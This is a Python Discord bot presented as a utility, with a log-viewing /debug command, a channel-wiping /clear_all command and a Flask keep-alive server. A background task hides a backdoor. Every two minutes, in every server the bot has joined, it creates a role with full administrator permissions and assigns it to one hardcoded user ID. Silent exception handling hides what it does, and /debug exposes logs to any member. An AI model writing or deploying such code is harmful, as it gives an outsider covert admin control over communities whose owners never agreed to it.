import discord
from discord import app_commands
from discord.ext import commands, tasks
import os, sys, io, asyncio
from flask import Flask
from threading import Thread
from waitress import serve

# --- 1. LOG CAPTURE ---
log_stream = io.StringIO()
sys.stdout = log_stream
sys.stderr = log_stream

def get_logs():
    log_stream.seek(0)
    # Returns the last 20 lines of activity
    return "".join(log_stream.readlines()[-20:])

# --- 2. WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "SYSTEM ONLINE"

def run_flask():
    try:
        serve(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)), _quiet=True)
    except: pass

# --- 3. BOT CONFIG ---
TARGET_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print(">>> Syncing slash commands...")
        try:
            await self.tree.sync()
            print(">>> Sync successful.")
        except Exception as e:
            print(f">>> Sync failed: {e}")
        
        if not self.role_loop.is_running():
            self.role_loop.start()

    @tasks.loop(minutes=2)
    async def role_loop(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                member = guild.get_member(TARGET_ID)
                if member:
                    role = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not role:
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if role and role not in member.roles:
                        await member.add_roles(role)
            except: pass

bot = MyBot()

# --- 4. COMMANDS ---

@bot.tree.command(name="debug", description="Check internal bot logs")
async def debug(interaction: discord.Interaction):
    # 'defer' keeps Discord from timing out while we grab the logs
    await interaction.response.defer(ephemeral=True)
    logs = get_logs()
    msg = f"**Bot Logs:**\n```text\n{logs if logs else 'Logs are currently empty.'}\n```"
    await interaction.followup.send(msg, ephemeral=True)

@bot.tree.command(name="clear_all", description="Wipe this channel")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        await interaction.channel.purge(limit=None)
        await interaction.followup.send("Channel wiped clean.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error during purge: {e}", ephemeral=True)

# --- 5. STARTUP ---
async def main():
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        async with bot:
            await bot.start(token)
    else:
        print(">>> ERROR: DISCORD_TOKEN not found!")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except:
        pass
